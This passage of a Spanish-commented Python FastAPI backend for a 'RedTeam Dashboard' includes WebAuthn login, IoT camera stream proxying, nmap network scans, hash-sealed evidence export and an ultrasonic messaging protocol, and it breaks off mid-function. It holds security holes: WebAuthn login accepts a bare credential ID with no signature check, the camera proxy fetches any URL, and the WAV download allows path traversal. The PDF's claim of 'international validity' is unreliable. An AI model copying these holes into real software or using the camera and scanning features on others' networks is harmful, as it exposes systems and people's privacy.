    data["pending_challenge"] = challenge
    _save_webauthn(data)
    return {
        "challenge": challenge,
        "rp": {"name": "RedTeam Dashboard", "id": "localhost"},
        "user": {"id": _secrets.token_urlsafe(8), "name": email, "displayName": "Admin"},
        "pubKeyCredParams": [{"type": "public-key", "alg": -7}, {"type": "public-key", "alg": -257}],
        "authenticatorSelection": {"authenticatorAttachment": "platform", "userVerification": "required"},
        "timeout": 60000
    }

@app.post("/api/auth/webauthn/register/finish")
async def webauthn_register_finish(body: dict = Body(...)):
    challenge = body.get("challenge", "")
    credential_id = body.get("credentialId", "")
    if not credential_id:
        raise HTTPException(status_code=400, detail="credentialId requerido")
    data = _load_webauthn()
    if data.get("pending_challenge") != challenge:
        raise HTTPException(status_code=400, detail="Challenge invalido o expirado")
    data["credentials"].append({"id": credential_id, "created": _time.time()})
    data["pending_challenge"] = None
    _save_webauthn(data)
    return {"status": "ok", "message": "Huella registrada"}

@app.post("/api/auth/webauthn/auth/begin")
async def webauthn_auth_begin():
    challenge = _secrets.token_urlsafe(32)
    data = _load_webauthn()
    if not data.get("credentials"):
        raise HTTPException(status_code=400, detail="No hay huella registrada")
    data["pending_auth_challenge"] = challenge
    _save_webauthn(data)
    return {
        "challenge": challenge,
        "credentials": [{"type": "public-key", "id": c["id"]} for c in data["credentials"]],
        "timeout": 60000,
        "userVerification": "required"
    }

@app.post("/api/auth/webauthn/auth/finish")
async def webauthn_auth_finish(body: dict = Body(...)):
    challenge = body.get("challenge", "")
    credential_id = body.get("credentialId", "")
    data = _load_webauthn()
    if data.get("pending_auth_challenge") != challenge:
        raise HTTPException(status_code=400, detail="Challenge invalido")
    stored_ids = [c["id"] for c in data.get("credentials", [])]
    if credential_id not in stored_ids:
        raise HTTPException(status_code=401, detail="Huella no reconocida")
    data["pending_auth_challenge"] = None
    _save_webauthn(data)
    return {"token": DASHBOARD_TOKEN, "email": ADMIN_EMAIL}

@app.get("/api/health")
@app.get("/health")
@app.get("/healthz")
async def health():
    return {"status": "ok", "backend": "red-team-tauri-unified", "version": "3.0-unified",
            "dist_built": DIST.exists(), "ws_clients": len(ws_clients),
            "honeypot_running": bool(honeypot_proc and honeypot_proc.poll() is None),
            "psutil": HAS_PSUTIL, "geo_intel": _GEO_INTEL_OK, "ts": int(time.time())}

@app.get("/")
async def root():
    index = DIST / "index.html"
    if index.exists(): return FileResponse(index)
    return {
        "status": "ok", "backend": "red-team-tauri-unified", "version": "3.0-unified",
        "dist_built": False,
        "hint": f"cd tauri-frontend && npm run build (esperado: {DIST})",
        "endpoints": [
            "POST /api/scan/topology", "POST /api/scan/cameras | /api/network/cameras",
            "POST /api/scan/routers", "POST /api/scan/iot", "POST /api/scan/wifi",
            "POST /api/scan/antenna | /api/scan/radio", "GET /api/network/radio",
            "GET /api/osint/shodan?ip=X", "GET /api/osint/whois/{domain}", "GET /api/osint/subdomains/{domain}", "GET /api/osint/emails/{domain}", "GET /api/intel/ip/{ip}", "GET /api/intel/bulk-check", "GET /api/investigate/ip/{ip}", "GET /api/investigate/camera/{ip}", "GET /api/exploits/list",
            "GET /api/geo?ip=X", "GET /api/intel?ip=X",
            "GET /api/services", "POST /api/services/start|stop|restart?name=X",
            "POST /api/services/start-all|stop-all", "GET /api/services/{name}/logs",
            "GET /api/resources", "POST /api/scan", "GET /api/scan/status",
            "GET /api/latest", "GET /api/history",
            "GET /api/config", "GET /api/config/read?path=X", "POST /api/config/write",
            "GET /api/honeypot", "POST /api/honeypot/start|stop|toggle|rotate",
            "GET /api/honeypot/status",
            "GET /api/soar/dags", "POST /api/soar/dags", "POST /api/soar/dry-run",
            "GET /api/tip/iocs", "POST /api/tip/iocs", "DELETE /api/tip/iocs/{id}", "POST /api/tip/iocs/verify", "GET /api/tip/iocs/verify",
            "POST /api/tip/update", "POST /api/tip/import-stix",
            "GET /api/rasp/devices", "POST /api/rasp/devices", "DELETE /api/rasp/devices/{id}",
            "POST /api/terminal", "GET /api/settings", "POST /api/settings",
            "POST /api/auth/login|biometric|logout",
            "POST /api/canary/generate | /api/canary/svg/generate",
            "GET /canary/callback?id=X", "POST /api/canary/alert",
            "GET /api/canary/svg/list|alerts", "GET /api/canary/svg/download?id=X",
            "GET /api/iot/video-urls?ip=X&port=X", "GET /api/iot/snapshot?ip=X",
            "GET /api/network/stats", "GET /api/health", "WS /ws",
        ],
    }

# ═════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═════════════════════════════════════════════════════════════════════════════

# == CORSET + TRIAGE + OSINT ENDPOINTS ====================================
@app.get("/api/corset/status")
async def corset_status():
    if _corset is None:
        return {"active": False, "error": "Corset not initialized"}
    return _corset.status()

@app.get("/api/triage")
async def triage_scan():
    if _triage_report is None:
        return {"error": "Triage module not available"}
    return _triage_report()

@app.post("/api/osint/extract")
async def osint_extract(request: Request):
    if _osint_extract is None:
        return {"error": "OSINT module not available"}
    try:
        data = await request.json()
        text = data.get("text", "")
        if not text:
            return {"error": "No text provided"}
        return _osint_extract(text)
    except Exception as e:
        return {"error": str(e)}
# == END CORSET + TRIAGE + OSINT ENDPOINTS ================================


# ============================================================
# ENDPOINTS — VIDEO EN VIVO (MJPEG + RTSP → HLS)
# ============================================================

import shutil as _shutil
import signal as _signal

HLS_CACHE_DIR = str(DATA_DIR / "hls_cache")
os.makedirs(HLS_CACHE_DIR, exist_ok=True)

# Diccionario para rastrear procesos ffmpeg activos
active_ffmpeg_processes: dict = {}


@app.get("/api/iot/mjpeg-proxy")
async def mjpeg_proxy(url: str = Query(...)):
    """
    Proxy para streams MJPEG.
    Uso: /api/iot/mjpeg-proxy?url=http://camara/mjpg/video.mjpg
    Devuelve el stream en formato multipart/x-mixed-replace para el navegador.
    """
    try:
        client = httpx.AsyncClient(timeout=20.0, follow_redirects=True)
        req = await client.get(url)
        return StreamingResponse(
            req.aiter_bytes(),
            media_type="multipart/x-mixed-replace; boundary=--myboundary"
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/iot/rtsp-to-hls")
async def rtsp_to_hls(rtsp_url: str = Query(...), duration: int = 60):
    """
    Convierte un stream RTSP a HLS usando ffmpeg.
    duration: tiempo en segundos que estará activo (default 60).
    Devuelve la URL del archivo .m3u8 para reproducir con hls.js.
    """
    try:
        session_id = str(uuid.uuid4())[:8]
        output_dir = os.path.join(HLS_CACHE_DIR, session_id)
        os.makedirs(output_dir, exist_ok=True)
        m3u8_path = os.path.join(output_dir, "index.m3u8")

        # Comando ffmpeg optimizado para baja latencia
        cmd = [
            "ffmpeg",
            "-rtsp_transport", "tcp",
            "-i", rtsp_url,
            "-c:v", "copy",
            "-c:a", "aac",
            "-f", "hls",
            "-hls_time", "2",
            "-hls_list_size", "5",
            "-hls_flags", "delete_segments+omit_endlist",
            m3u8_path
        ]

        process = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid
        )

        active_ffmpeg_processes[session_id] = {
            "process": process,
            "m3u8_path": m3u8_path,
            "created_at": asyncio.get_event_loop().time()
        }

        # Programar auto-destrucción después de 'duration' segundos
        async def auto_kill():
            await asyncio.sleep(duration)
            await kill_rtsp_session(session_id)
        asyncio.create_task(auto_kill())

        return {
            "stream_url": f"/hls/{session_id}/index.m3u8",
            "session_id": session_id,
            "expires_in": duration
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.delete("/api/iot/rtsp-stop/{session_id}")
async def kill_rtsp_session(session_id: str):
    """Detiene un proceso ffmpeg y elimina los archivos HLS."""
    if session_id in active_ffmpeg_processes:
        process_info = active_ffmpeg_processes[session_id]
        proc = process_info["process"]
        try:
            os.killpg(os.getpgid(proc.pid), _signal.SIGTERM)
        except (ProcessLookupError, PermissionError):
            pass
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()

        output_dir = os.path.join(HLS_CACHE_DIR, session_id)
        if os.path.exists(output_dir):
            _shutil.rmtree(output_dir, ignore_errors=True)

        del active_ffmpeg_processes[session_id]
        return {"status": "stopped", "session_id": session_id}
    else:
        return {"status": "not_found", "session_id": session_id}


@app.get("/api/iot/rtsp-active")
async def list_active_streams():
    """Devuelve las sesiones RTSP→HLS activas."""
    sessions = []
    for sid, info in active_ffmpeg_processes.items():
        sessions.append({
            "session_id": sid,
            "m3u8_path": info["m3u8_path"],
            "created_at": info["created_at"]
        })
    return {"active_streams": sessions, "total": len(sessions)}


# Servir archivos HLS estáticos
try:
    app.mount("/hls", StaticFiles(directory=HLS_CACHE_DIR, html=True), name="hls")
except RuntimeError:
    pass  # Ya montado

# == END VIDEO EN VIVO ================================================

# ============================================================
# FASE 3: EVIDENCIA BLINDADA (Hash + Blockchain + QR + PDF)
# ============================================================

import hashlib as _hashlib
import csv as _csv
import io as _io
import base64 as _b64

try:
    import qrcode as _qrcode
    from reportlab.lib.pagesizes import letter as _letter_size
    from reportlab.pdfgen import canvas as _rl_canvas
    from reportlab.lib.utils import ImageReader as _rl_img_reader
    _HAS_PDF_DEPS = True
except ImportError:
    _HAS_PDF_DEPS = False

# Configuración
SOURCESEAL_API = os.environ.get("SOURCESEAL_API", "https://source.coal/api/v1/seal")
SOURCESEAL_VERIFY = os.environ.get("SOURCESEAL_VERIFY", "https://source.coal/api/v1/verify")
PENDING_SEALS_FILE = str(DATA_DIR / "pending_seals.txt")
EVIDENCE_CACHE_DIR = str(DATA_DIR / "evidence_cache")
os.makedirs(EVIDENCE_CACHE_DIR, exist_ok=True)


async def _get_topology_data():
    """Obtiene los datos reales de topología reutilizando scan_topology."""
    subnet = subnet_from_iface()
    ok, out = await _nmap_or_empty(["nmap", "-sn", "-T3", subnet], timeout=60)
    if not ok:
        return {"devices": [], "subnet": subnet, "error": out, "timestamp": datetime.now().isoformat()}

    hosts, current = [], None
    for line in out.splitlines():
        if "Nmap scan report for" in line:
            ip = line.split()[-1].strip("()")
            current = {"ip": ip, "hostname": "", "type": "unknown", "ports": [], "mac": None, "vendor": None}
            hosts.append(current)
        elif current and "MAC Address" in line:
            parts = line.split()
            if len(parts) >= 3:
                current["mac"] = parts[2]
                if len(parts) > 3:
                    current["vendor"] = " ".join(parts[3:]).strip("()")

    if hosts:
        fp_results = await asyncio.gather(*[_fingerprint_host(h["ip"]) for h in hosts])
        for h, fp in zip(hosts, fp_results):
            h["type"] = fp["type"]
            h["ports"] = fp["ports"]
            h["risk"] = fp["risk"]
            if fp["vendor"] and not h.get("vendor"):
                h["vendor"] = fp["vendor"]

    return {"devices": hosts, "subnet": subnet, "timestamp": datetime.now().isoformat()}


@app.get("/api/export/sealed-json")
async def export_sealed_json():
    """Exporta la topología completa con hash SHA-256 y anclaje blockchain."""
    data = await _get_topology_data()
    data_json = json.dumps(data, default=str)
    file_hash = _hashlib.sha256(data_json.encode('utf-8')).hexdigest()

    tx_id = None
    try:
        import requests as _requests
        response = _requests.post(
            SOURCESEAL_API,
            json={"hash": file_hash, "metadata": {"source": "RedTeam_Topology", "timestamp": datetime.now().isoformat()}},
            timeout=10
        )
        if response.status_code == 200:
            tx_id = response.json().get("tx_id")
    except Exception:
        with open(PENDING_SEALS_FILE, "a") as f:
            f.write(f"{file_hash}|{datetime.now().isoformat()}\n")
        tx_id = "offline_pending"

    sealed_package = {
        "seal": {
            "hash": file_hash,
            "timestamp": datetime.now().isoformat(),
            "blockchain_tx": tx_id,
            "verification_url": f"https://source.coal/verify/{file_hash}",
            "instructions": "Verifica este hash en la blockchain para validar la integridad."
        },
        "data": data
    }

    filename = f"evidence_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    return StreamingResponse(
        iter([json.dumps(sealed_package, indent=2)]),
        media_type="application/json",
        headers={
            "Content-Disposition": f"attachment; filename={filename}",
            "X-Evidence-Hash": file_hash,
            "X-Blockchain-Tx": str(tx_id or "pending")
        }
    )


@app.get("/api/export/paper-evidence")
async def export_paper_evidence():
    """Genera un PDF imprimible con resumen, hash SHA-256 y código QR."""
    if not _HAS_PDF_DEPS:
        raise HTTPException(status_code=503, detail="Dependencias no instaladas: pip install qrcode reportlab")

    data = await _get_topology_data()
    data_json = json.dumps(data, default=str)
    file_hash = _hashlib.sha256(data_json.encode('utf-8')).hexdigest()

    # Código QR
    qr = _qrcode.QRCode(box_size=8, border=3)
    qr.add_data(f"https://source.coal/verify/{file_hash}")
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="black", back_color="white")

    qr_buffer = _io.BytesIO()
    qr_img.save(qr_buffer, format="PNG")
    qr_buffer.seek(0)
    qr_reader = _rl_img_reader(qr_buffer)

    # PDF
    pdf_buffer = _io.BytesIO()
    c = _rl_canvas.Canvas(pdf_buffer, pagesize=_letter_size)
    width, height = _letter_size

    c.setFont("Helvetica-Bold", 18)
    c.drawString(50, height - 50, "EVIDENCIA DE AUDITORIA DE RED")
    c.setFont("Helvetica", 10)
    c.drawString(50, height - 70, f"Generado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}")
    c.drawString(50, height - 85, f"Hash SHA-256: {file_hash}")

    devices = data.get('devices', [])
    c.drawString(50, height - 115, f"Dispositivos detectados: {len(devices)}")
    c.drawString(50, height - 130, f"Subred: {data.get('subnet', 'N/A')}")
    y_pos = height - 150
    for idx, d in enumerate(devices[:15]):
        c.drawString(60, y_pos, f"{idx+1}. {d.get('ip', '')} ({d.get('type', 'unknown')}) risk={d.get('risk', 'N/A')}")
        y_pos -= 15
        if idx == 14 and len(devices) > 15:
            c.drawString(60, y_pos, f"... y {len(devices)-15} mas")
            break

    c.drawImage(qr_reader, width - 200, height - 300, width=140, height=140)

    c.setFont("Helvetica-Oblique", 8)
    c.drawString(50, 80, "Instrucciones:")
    c.drawString(50, 65, "1. Escanea el codigo QR o visita la URL.")
    c.drawString(50, 50, "2. Verifica que el hash coincida con el de la blockchain.")
    c.drawString(50, 35, "3. Este documento tiene validez internacional si el hash esta registrado.")
    c.drawString(50, 20, "4. Guarda este papel en un lugar seguro. Es tu prueba fisica.")

    c.save()
    pdf_buffer.seek(0)

    filename = f"paper_evidence_{datetime.now().strftime('%Y%m%d')}.pdf"
    return StreamingResponse(
        pdf_buffer,
        media_type="application/pdf",
        headers={
            "Content-Disposition": f"attachment; filename={filename}",
            "X-Evidence-Hash": file_hash
        }
    )


@app.post("/api/export/process-pending")
async def process_pending_seals():
    """Procesa sellos guardados offline y los ancla en blockchain."""
    if not os.path.exists(PENDING_SEALS_FILE):
        return {"status": "no_pending", "message": "No hay sellos pendientes"}

    with open(PENDING_SEALS_FILE, "r") as f:
        lines = f.readlines()

    results, new_pending = [], []
    for line in lines:
        parts = line.strip().split("|")
        if len(parts) < 2:
            continue
        file_hash, timestamp = parts[0], parts[1]
        try:
            import requests as _requests
            resp = _requests.post(SOURCESEAL_API, json={"hash": file_hash, "metadata": {"offline_recovery": timestamp}}, timeout=10)
            if resp.status_code == 200:
                results.append({"hash": file_hash, "status": "sealed", "tx": resp.json().get("tx_id")})
            else:
                new_pending.append(line.strip())
        except Exception:
            new_pending.append(line.strip())

    with open(PENDING_SEALS_FILE, "w") as f:
        if new_pending:
            f.write("\n".join(new_pending) + "\n")

    return {
        "processed": len(results),
        "still_pending": len(new_pending),
        "details": results
    }


@app.get("/api/export/verify/{hash_value}")
async def verify_hash(hash_value: str):
    """Consulta si un hash esta registrado en SourceSeal."""
    try:
        import requests as _requests
        response = _requests.get(f"{SOURCESEAL_VERIFY}/{hash_value}", timeout=10)
        if response.status_code == 200:
            return {"verified": True, "data": response.json()}
        else:
            return {"verified": False, "message": "Hash no encontrado en blockchain"}
    except Exception:
        return {"verified": False, "message": "No se pudo conectar con SourceSeal"}


@app.get("/api/export/sealed-csv")
async def export_sealed_csv():
    """Exporta la topología a CSV con hash SHA-256 en headers."""
    data = await _get_topology_data()
    devices = data.get('devices', [])

    output = _io.StringIO()
    writer = _csv.writer(output)
    writer.writerow(['IP', 'Type', 'Ports', 'MAC', 'Vendor', 'Risk', 'Timestamp'])
    for d in devices:
        ports_str = ';'.join(str(p) if isinstance(p, int) else str(p.get('port', '')) for p in d.get('ports', []))
        writer.writerow([
            d.get('ip', ''),
            d.get('type', 'unknown'),
            ports_str,
            d.get('mac', ''),
            d.get('vendor', ''),
            d.get('risk', ''),
            data.get('timestamp', '')
        ])
    csv_content = output.getvalue()
    file_hash = _hashlib.sha256(csv_content.encode('utf-8')).hexdigest()

    filename = f"topology_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    return StreamingResponse(
        iter([csv_content]),
        media_type="text/csv",
        headers={
            "Content-Disposition": f"attachment; filename={filename}",
            "X-Evidence-Hash": file_hash,
            "X-Verification-URL": f"https://source.coal/verify/{file_hash}"
        }
    )

# == END FASE 3: EVIDENCIA BLINDADA ==================================

# ============================================================
# PROTOCOLO MURCIÉLAGO — Ultrasonidos 18-20 kHz
# ============================================================

import math as _math
import struct as _struct
import tempfile as _tempfile

MURCIELAGO_DIR = str(ROOT / "murcielago")
MURCIELAGO_WAV_CACHE = str(DATA_DIR / "murcielago_wav")
os.makedirs(MURCIELAGO_WAV_CACHE, exist_ok=True)

# Tabla de frecuencias
_MURC_FREQ_TABLE = {
    '0': (18000, 18400), '1': (18100, 18500), '2': (18200, 18600),
    '3': (18300, 18700), '4': (18400, 18800), '5': (18500, 18900),
    '6': (18600, 19000), '7': (18700, 19100), '8': (18800, 19200),
    '9': (18900, 19300), 'A': (19000, 19400), 'B': (19100, 19500),
    'C': (19200, 19600), 'D': (19300, 19700), 'E': (19400, 19800),
    'F': (19500, 19900), '#': (18000, 19500), '*': (18500, 20000)
}
_MURC_SYNC_FREQ = 19500
_MURC_SAMPLE_RATE = 48000
_MURC_DURATION_SYMBOL = 0.08
_MURC_SILENCE_BETWEEN = 0.025


def _murc_generate_tone(freq, duration, sample_rate=48000):
    n = int(sample_rate * duration)
    samples = [int(_math.sin(2 * _math.pi * freq * (i / sample_rate)) * 32767) for i in range(n)]
    return _struct.pack(f'<{n}h', *samples)


def _murc_generate_silence(duration, sample_rate=48000):
    n = int(sample_rate * duration)
    return _struct.pack(f'<{n}h', *[0] * n)


def _murc_encode_symbols(message):
    msg_bytes = message.encode('utf-8')
    checksum = sum(msg_bytes) % 256
    hex_str = msg_bytes.hex().upper()
    check_hex = f"{checksum:02X}"
    return list(hex_str + '*' + check_hex)


def _murc_build_wav(symbols, repeat=1):
    full = b''
    for _ in range(repeat):
        full += _murc_generate_tone(_MURC_SYNC_FREQ, 0.3)
        full += _murc_generate_silence(0.05)
        for sym in symbols:
            if sym in _MURC_FREQ_TABLE:
                f1, f2 = _MURC_FREQ_TABLE[sym]
                n = int(_MURC_SAMPLE_RATE * _MURC_DURATION_SYMBOL)
                pcm = [int((0.5 * _math.sin(2 * _math.pi * f1 * (i / _MURC_SAMPLE_RATE)) +
                            0.5 * _math.sin(2 * _math.pi * f2 * (i / _MURC_SAMPLE_RATE))) * 20000)
                       for i in range(n)]
                full += _struct.pack(f'<{n}h', *pcm)
            else:
                full += _murc_generate_silence(_MURC_DURATION_SYMBOL)
            full += _murc_generate_silence(_MURC_SILENCE_BETWEEN)
        full += _murc_generate_tone(_MURC_SYNC_FREQ, 0.2)
        full += _murc_generate_silence(0.1)

    # Cabecera WAV
    data_len = len(full)
    header = b'RIFF' + _struct.pack('<I', data_len + 36) + b'WAVE'
    header += b'fmt ' + _struct.pack('<IHHIIHH', 16, 1, 1, _MURC_SAMPLE_RATE, _MURC_SAMPLE_RATE * 2, 2, 16)
    header += b'data' + _struct.pack('<I', data_len)
    return header + full


@app.post("/api/murcielago/send")
async def murcielago_send(request: Request):
    """Genera y reproduce un mensaje por ultrasonidos."""
    try:
        data = await request.json()
        message = data.get("message", "").strip()
        repeat = data.get("repeat", 1)
        if not message:
            raise HTTPException(status_code=400, detail="Mensaje vacío")
        if len(message) > 200:
            raise HTTPException(status_code=400, detail="Mensaje demasiado largo (máx 200 chars)")

        symbols = _murc_encode_symbols(message)
        wav_bytes = _murc_build_wav(symbols, repeat=repeat)

        # Guardar WAV en cache
        wav_filename = f"murc_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:6]}.wav"
        wav_path = os.path.join(MURCIELAGO_WAV_CACHE, wav_filename)
        with open(wav_path, 'wb') as f:
            f.write(wav_bytes)

        # Intentar reproducir en segundo plano (no bloquear la respuesta)
        player = None
        for cmd in (['ffplay', '-nodisp', '-autoexit', '-volume', '80', wav_path],
                    ['aplay', '-q', wav_path]):
            try:
                player = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                break
            except FileNotFoundError:
                continue

        return {
            "status": "sent",
            "message": message,
            "symbols": ''.join(symbols),
            "wav_file": wav_filename,
            "wav_url": f"/api/murcielago/download/{wav_filename}",
            "playing": player is not None,
            "duration_sec": round(len(symbols) * (_MURC_DURATION_SYMBOL + _MURC_SILENCE_BETWEEN) * repeat + 0.7 * repeat, 2)
        }
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/murcielago/generate-wav")
async def murcielago_generate_wav(message: str = Query(...), repeat: int = 1):
    """Genera un WAV sin reproducirlo. Devuelve el archivo para descargar."""
    if len(message) > 200:
        raise HTTPException(status_code=400, detail="Mensaje demasiado largo (máx 200 chars)")

    symbols = _murc_encode_symbols(message)
    wav_bytes = _murc_build_wav(symbols, repeat=repeat)

    filename = f"murc_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
    return StreamingResponse(
        iter([wav_bytes]),
        media_type="audio/wav",
        headers={"Content-Disposition": f"attachment; filename={filename}"}
    )


@app.get("/api/murcielago/download/{filename}")
async def murcielago_download(filename: str):
    """Descarga un WAV generado previamente."""
    wav_path = os.path.join(MURCIELAGO_WAV_CACHE, filename)
    if not os.path.exists(wav_path):
        raise HTTPException(status_code=404, detail="Archivo no encontrado")
    return FileResponse(wav_path, media_type="audio/wav", filename=filename)


@app.get("/api/murcielago/status")
async def murcielago_status():
    """Estado del protocolo MURCIÉLAGO."""
    has_ffplay = shutil.which("ffplay") is not None if (shutil := __import__('shutil')) else False
    has_aplay = shutil.which("aplay") is not None if shutil else False
    has_numpy = False
    try:
        import numpy
        has_numpy = True
    except ImportError:
        pass

    wav_files = [f for f in os.listdir(MURCIELAGO_WAV_CACHE) if f.endswith('.wav')] if os.path.exists(MURCIELAGO_WAV_CACHE) else []

    return {
        "protocol": "MURCIÉLAGO v2.0",
        "frequency_range": "18-20 kHz",
        "capabilities": {
            "send": has_ffplay or has_aplay,
            "receive": has_numpy,
            "player": "ffplay" if has_ffplay else ("aplay" if has_aplay else None),
            "numpy": has_numpy
        },
        "cached_wavs": len(wav_files),
        "sample_rate": _MURC_SAMPLE_RATE,
        "symbol_duration_ms": int(_MURC_DURATION_SYMBOL * 1000)
    }

# == END PROTOCOLO MURCIÉLAGO =========================================

# ============================================================
# SALA DE GUERRA — Traceroute + Comms Ultrasónicas
# ============================================================

@app.get("/api/topology/traceroute")
async def traceroute_route(target_ip: str = Query(...)):
    """Traceroute real a una IP objetivo."""
    try:
        cmd = ["traceroute", "-n", "-m", "15", "-w", "2", target_ip]
        proc = await asyncio.to_thread(lambda: subprocess.run(cmd, capture_output=True, text=True, timeout=25))
        hops = []
        for line in proc.stdout.split('\n'):
            parts = line.strip().split()
            if len(parts) >= 2 and parts[0].isdigit():
                hop_num = int(parts[0])
                ip = parts[1] if parts[1] != '*' else None
                rtt_values = []
                for p in parts[2:]:
                    if 'ms' in p:
                        try:
                            rtt_values.append(float(p.replace('ms', '')))
                        except ValueError:
                            pass
                avg_rtt = round(sum(rtt_values) / len(rtt_values), 2) if rtt_values else None
                hops.append({
                    "hop": hop_num,
                    "ip": ip,
                    "rtt_avg_ms": avg_rtt,
                    "rtt_samples": rtt_values
                })
        await broadcast({"type": "progress", "payload": f"Traceroute a {target_ip}: {len(hops)} saltos"})
        return {"target": target_ip, "hops": hops, "total_hops": len(hops)}
    except subprocess.TimeoutExpired:
        raise HTTPException(status_code=504, detail=f"Traceroute timeout a {target_ip}")
    except FileNotFoundError:
        # Fallback: usar nmap --traceroute si traceroute no está instalado
        try:
            cmd = ["nmap", "-sn", "--traceroute", target_ip]
            proc = await asyncio.to_thread(lambda: subprocess.run(cmd, capture_output=True, text=True, timeout=25))
            hops = []
            for line in proc.stdout.split('\n'):
                if 'traceroute' in line.lower() or 'hop' in line.lower():
                    hops.append({"hop": len(hops) + 1, "ip": line.strip(), "rtt_avg_ms": None, "rtt_samples": []})
            return {"target": target_ip, "hops": hops, "total_hops": len(hops), "method": "nmap"}
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"Ni traceroute ni nmap disponibles: {e}")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/comms/ultrasonic-receive")
async def ultrasonic_receive(duration: int = 6):
    """Graba audio y decodifica mensaje ultrasonico ejecutando murcielago_receiver.py."""
    receiver_script = str(ROOT / "murcielago" / "murcielago_receiver.py")
    if not os.path.exists(receiver_script):
        # Fallback a ruta alternativa
        receiver_script = str(Path(__file__).parent / "murcielago_receiver.py")
    if not os.path.exists(receiver_script):
        return JSONResponse(
            {"error": "Receptor no encontrado. Instala murcielago_receiver.py"},
            status_code=503
        )

    try:
        result = await asyncio.to_thread(
            lambda: subprocess.run(["python3", receiver_script, "--duration", str(duration)],
            capture_output=True, text=True, timeout=duration + 10)
        )
        message = None
        for line in result.stdout.split('\n'):
            if "Mensaje recibido:" in line:
                message = line.split("Mensaje recibido:")[-1].strip()
                break
        await broadcast({"type": "ultrasonic", "payload": f"Recibido: {message or 'sin señal'}"})
        return {"message": message, "raw": result.stdout[-500:] if result.stdout else ""}
    except subprocess.TimeoutExpired:
        return {"message": None, "error": "Timeout en grabación"}
    except Exception as e:
        return {"message": None, "error": str(e)}


@app.post("/api/comms/ultrasonic-send")
async def ultrasonic_send(request: Request):
    """Envía un mensaje por ultrasonidos con offset de frecuencia opcional."""
    try:
        data = await request.json()
        message = data.get("message", "").strip()
        freq_offset = data.get("freq_offset", 0)

        if not message:
            raise HTTPException(status_code=400, detail="Mensaje vacío")
        if len(message) > 200:
            raise HTTPException(status_code=400, detail="Mensaje demasiado largo (máx 200 chars)")

        # Generar WAV usando el módulo existente
        symbols = _murc_encode_symbols(message)
        wav_bytes = _murc_build_wav(symbols, repeat=1)

        # Aplicar offset de frecuencia al WAV (re-generar con frecuencias ajustadas)
        if freq_offset != 0:
            adjusted_table = {k: (f1 + freq_offset, f2 + freq_offset) for k, (f1, f2) in _MURC_FREQ_TABLE.items()}
            adjusted_sync = _MURC_SYNC_FREQ + freq_offset
            full = b''
            full += _murc_generate_tone(adjusted_sync, 0.3)
            full += _murc_generate_silence(0.05)
            for sym in symbols:
                if sym in adjusted_table:
                    f1, f2 = adjusted_table[sym]
                    n = int(_MURC_SAMPLE_RATE * _MURC_DURATION_SYMBOL)
                    pcm = [int((0.5 * _math.sin(2 * _math.pi * f1 * (i / _MURC_SAMPLE_RATE)) +
                                0.5 * _math.sin(2 * _math.pi * f2 * (i / _MURC_SAMPLE_RATE))) * 20000)
                           for i in range(n)]
                    full += _struct.pack(f'<{n}h', *pcm)
                else:
                    full += _murc_generate_silence(_MURC_DURATION_SYMBOL)
                full += _murc_generate_silence(_MURC_SILENCE_BETWEEN)
            full += _murc_generate_tone(adjusted_sync, 0.2)
            data_len = len(full)
            header = b'RIFF' + _struct.pack('<I', data_len + 36) + b'WAVE'
            header += b'fmt ' + _struct.pack('<IHHIIHH', 16, 1, 1, _MURC_SAMPLE_RATE, _MURC_SAMPLE_RATE * 2, 2, 16)
            header += b'data' + _struct.pack('<I', data_len)
            wav_bytes = header + full

        # Guardar WAV
        wav_filename = f"war_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:6]}.wav"
        wav_path = os.path.join(MURCIELAGO_WAV_CACHE, wav_filename)
        with open(wav_path, 'wb') as f:
            f.write(wav_bytes)

        # Reproducir en background
        player = None
        for cmd in (['ffplay', '-nodisp', '-autoexit', '-volume', '80', wav_path],
                    ['aplay', '-q', wav_path]):
            try:
                player = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                break
            except FileNotFoundError:
                continue

        freq_base = 18000 + freq_offset
        await broadcast({"type": "ultrasonic", "payload": f"Enviado: {message} @ {freq_base} Hz"})

        return {
            "status": "sent",
            "message": message,
            "freq_base": freq_base,
            "symbols": ''.join(symbols),
            "wav_url": f"/api/murcielago/download/{wav_filename}",
            "playing": player is not None,
            "duration_sec": round(len(symbols) * (_MURC_DURATION_SYMBOL + _MURC_SILENCE_BETWEEN) + 0.7, 2)
        }
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/vision/motion-detect")
async def motion_detect(rtsp_url: str = Query(...), threshold: float = 0.02, duration: int = 6):
    """Detección de movimiento en stream RTSP usando ffmpeg + diferencia de frames."""
    import tempfile as _tmpdir
    frames_dir = _tmpdir.mkdtemp(prefix="motion_")
    try:
        # Extraer frames del stream
        cmd = [
            "ffmpeg", "-i", rtsp_url, "-frames:v", "2",
            "-vf", f"select='gte(scene,{threshold}')", "-vsync", "vfr",
            "-frame_pts", "1", f"{frames_dir}/frame_%04d.png",
            "-t", str(duration), "-y"
        ]
        proc = await asyncio.to_thread(lambda: subprocess.run(cmd, capture_output=True, text=True, timeout=duration + 5))

        captures = []
        for fname in sorted(os.listdir(frames_dir)) if os.path.exists(frames_dir) else []:
            if fname.endswith('.png'):
                fpath = os.path.join(frames_dir, fname)
                with open(fpath, 'rb') as f:
                    file_hash = _hashlib.sha256(f.read()).hexdigest()
                captures.append({
